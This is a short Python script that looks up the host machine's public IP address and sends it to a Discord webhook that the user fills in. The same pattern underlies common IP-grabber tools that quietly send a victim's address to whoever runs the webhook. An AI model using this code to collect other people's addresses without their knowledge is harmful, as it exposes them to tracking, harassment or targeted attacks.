import socket
from requests import get
import requests
from discord import RequestsWebhookAdapter
from discord import Webhook as WebHook

webhook = "YOUR WEBHOOK" #Put your webhook here
webhook = WebHook.from_url(webhook, adapter=RequestsWebhookAdapter())

PubIP = get('https://api.ipify.org').text

webhook.send("Public IP:")
webhook.send(PubIP)